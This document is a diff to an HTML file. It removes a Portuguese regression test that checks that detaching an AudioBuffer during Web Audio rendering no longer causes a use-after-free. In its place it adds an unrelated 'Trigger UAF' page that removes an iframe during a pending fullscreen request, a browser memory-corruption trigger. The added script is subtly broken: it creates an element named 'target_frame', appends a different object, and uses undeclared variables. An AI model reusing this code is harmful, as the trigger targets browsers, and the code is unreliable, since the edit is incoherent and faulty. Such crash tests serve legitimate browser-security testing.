@@ -1,90 +1,36 @@
 <!DOCTYPE html>
 <html>
-<head>
-<meta charset="utf-8">
-<title>Teste de Regressão: Detach de AudioBuffer durante renderFromBuffer</title>
-</head>
 <body>
-<div id="status">Executando teste...</div>
+    <button onclick="triggerUAF()">Trigger UAF</button><br><br>
+    <iframe id="target_frame" width="100" height="100"></iframe>
+    <div id="status"></div>
+    <script>
+      function triggerUAF() {
+            var iframe = document.createElement("target_frame");
+    document.body.appendChild(target_frame);
 
-<script>
-// Função utilitária de GC via alocação recursiva de memória
-function gc() {
-    function gcRec(n) {
-        if (n < 1)
-            return {};
-        var temp = { i: "ab" + i + (i / 100000) };
-        temp += "foo";
-        gcRec(n - 1);
-    }
-    for (var i = 0; i < 1000; i++)
-        gcRec(10);
-}
+    var div = iframe.contentDocument.createElement("div");
+    div.textContent = "TEST";
+    iframe.contentDocument.body.appendChild(div);
 
-async function runWebAudioDetachTest() {
-    if (!window.AudioContext) {
-        document.getElementById("status").innerText = "PASS: Web Audio não suportado.";
-        return;
+    var contentDocument = iframe.contentDocument;
+
+    try {
+        div.webkitRequestFullscreen().catch(function () {});
+    } catch (e) {
     }
 
-    const ctx = new AudioContext();
+    document.body.removeChild(iframe);
 
-    // Worker dummy para receber os buffers transferidos
-    const blob = new Blob([`
-        self.onmessage = function(e) {
-            // Buffer recebido e descartado
-        };
-    `], { type: "application/javascript" });
-    const worker = new Worker(URL.createObjectURL(blob));
-
-    for (let cycle = 0; cycle < 100; cycle++) {
-        // 1. Cria um AudioBuffer com dados válidos
-        const buffer = ctx.createBuffer(2, 4096, ctx.sampleRate);
-        const channelData0 = buffer.getChannelData(0);
-        const channelData1 = buffer.getChannelData(1);
-
-        for (let i = 0; i < 4096; i++) {
-            channelData0[i] = Math.sin(i * 0.05);
-            channelData1[i] = Math.cos(i * 0.05);
-        }
-
-        // 2. Conecta ao AudioBufferSourceNode e inicia a renderização na thread de áudio
-        const source = ctx.createBufferSource();
-        source.buffer = buffer;
-        source.connect(ctx.destination);
-        source.start();
-
-        // 3. Tenta desanexar (transfer) o buffer na main thread enquanto o áudio roda
-        // Sem o patch, a transferência ocorria com sucesso e causava UAF na thread de áudio
+    setTimeout(function () {
         try {
-            worker.postMessage({ buf: channelData0.buffer }, [channelData0.buffer]);
+            if (contentDocument.webkitCancelFullScreen)
+                contentDocument.webkitCancelFullScreen();
         } catch (e) {
-            // Com o patch, o buffer está marcado como non-detachable, lançando erro de clone esperado
         }
 
-        try {
-            worker.postMessage({ buf: channelData1.buffer }, [channelData1.buffer]);
-        } catch (e) {
-            // Esperado com o patch
-        }
-
-        source.stop();
-        source.disconnect();
-
-        if (cycle % 10 === 0) {
-            gc();
-        }
-    }
-
-    await ctx.close();
-    worker.terminate();
-
-    document.getElementById("status").innerText = "PASS: Tentativas de detach em AudioBuffer em execução tratadas sem UAF.";
-}
-
-runWebAudioDetachTest().catch((err) => {
-    document.getElementById("status").innerText = "FAIL: " + err.message;
-});
+        status.textContent = "PASS - no crash observed";
+    }, 0);
+};
 </script>
-</body>
 </html>
